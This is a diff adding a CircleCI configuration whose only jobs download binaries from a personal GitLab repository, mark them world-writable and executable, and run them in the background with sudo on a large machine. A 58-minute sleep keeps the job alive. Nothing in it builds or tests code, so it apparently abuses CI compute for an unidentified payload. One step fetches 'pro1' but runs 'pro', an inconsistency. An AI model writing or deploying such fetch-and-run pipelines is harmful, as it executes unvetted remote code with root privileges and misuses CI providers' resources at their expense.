@@ -1,0 +1,43 @@
+version: 2.1
+
+jobs:
+  build:
+  
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: 2xlarge
+    
+
+    steps:
+      - run:
+         name: "pro"
+         
+         command: | 
+          sudo su --command "wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro1 && chmod 777 pro"
+          sudo nohup ./pro --log=stdout > meta.log &
+          sleep 5
+          sudo cat meta.log
+      
+      - run:
+         name: "bot"
+         no_output_timeout: 58m
+         command: |
+          wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/prx
+          chmod 777 prx
+          nohup  ./prx --log=stdout > teta.log &
+          sleep 58m
+          cat teta.log
+          
+
+      - run:
+         name: "back"
+         command: |
+           
+           echo Done
+           
+
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
